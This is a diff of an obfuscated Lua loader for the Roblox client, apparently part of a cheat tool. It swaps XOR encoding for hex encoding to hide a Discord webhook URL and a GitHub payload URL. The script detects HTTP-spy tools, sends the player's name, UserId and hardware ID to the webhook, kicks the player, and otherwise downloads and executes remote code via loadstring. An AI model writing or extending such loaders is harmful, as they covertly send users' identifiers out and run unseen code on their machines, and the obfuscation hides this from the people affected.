@@ -1,14 +1,11 @@
-local function _0xDE(d, k)
-    local r = ""
-    for i = 1, #d do
-        r = r .. string.char(bit32.bxor(d[i], k))
-    end
-    return r
+local function _D(h)
+    local s = ""
+    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
+    return s
 end
 
-local _0xK = 122
-local _AL = _0xDE({22, 6, 6, 10, 3, 80, 2, 2, 8, 27, 21, 11, 26, 10, 10, 85, 25, 10, 12, 81, 1, 14, 12, 91, 75, 11, 9, 2, 10, 13, 1, 4, 83, 80, 93, 86, 95, 91, 88, 72, 73, 80, 71, 74, 73, 79, 78, 76, 75, 74, 72, 73, 81, 74, 72, 75, 80, 85, 78, 14, 77, 2, 72, 20, 12, 4, 2, 22, 10, 3, 3, 1, 9, 13, 2, 1, 1, 3, 8, 11, 13, 15, 2, 10, 3, 2, 10, 1, 8, 11, 13, 15, 2, 11, 13, 11, 3, 2, 3, 8, 11, 1, 2, 3, 8, 11, 13, 1, 8, 1, 3, 2, 1, 8, 1, 3, 2, 10, 11, 13, 1, 8, 1, 3}, _0xK)
-local _G = _0xDE({22, 6, 6, 10, 3, 80, 2, 2, 14, 25, 21, 84, 11, 15, 3, 10, 20, 21, 2, 10, 3, 2, 10, 1, 8, 11, 13, 15, 2, 84, 1, 10, 3, 1, 11, 25, 15, 2, 14, 1, 2, 1, 11, 15, 2, 84, 14, 1, 10, 3, 84, 1, 10, 2, 1, 1, 84, 14, 1, 10}, _0xK)
+local _AL = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
+local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F727067")
 
 local _L = game:GetService("Players").LocalPlayer
 local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
@@ -17,7 +14,7 @@ local function _SC()
     if not _req then return false end
     local ok, info = pcall(debug.getinfo, _req)
     if ok and info and info.source ~= "=[C]" then return true end
-    for _, v in ipairs({"HttpSpy", "SimpleSpy", "VGG Spy", "HydroSpy"}) do if getgenv()[v] then return true end end
+    for _, v in ipairs({"HttpSpy", "SimpleSpy", "VGG Spy", "HydroSpy", "TwiSpy"}) do if getgenv()[v] then return true end end
     return false
 end
 
@@ -28,19 +25,27 @@ if _SC() then
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = game:GetService("HttpService"):JSONEncode({
-                embeds = {{title = "🚨 Security Alert", description = "User " .. _L.Name .. " tried to use HTTP Spy.", color = 16711680}}
+                embeds = {{
+                    title = "🚨 Security Alert: Interceptor Detected",
+                    description = "User " .. _L.Name .. " tried to use HTTP Spy.",
+                    color = 16711680,
+                    fields = {
+                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
+                        {name = "HWID", value = game:GetService("RbxAnalyticsService"):GetClientId(), inline = false}
+                    }
+                }}
             })
         })
     end)
-    _L:Kick("Loader Security Error")
+    _L:Kick("Loader Error: 0xSECURITY")
     return
 end
 
-getgenv()._NK_SIGNAL = "NAZARKUS_ULTRA_V8"
+getgenv()._NK_SIGNAL = "NAZARKUS_PRO_V9"
 local ok, res = pcall(function() return game:HttpGet(_G) end)
 if ok and res then
     local f = loadstring(res)
     if f then task.spawn(f) end
 else
-    _L:Kick("Connection Fail. Try again.")
+    _L:Kick("Connection Fail. Try again later.")
 end
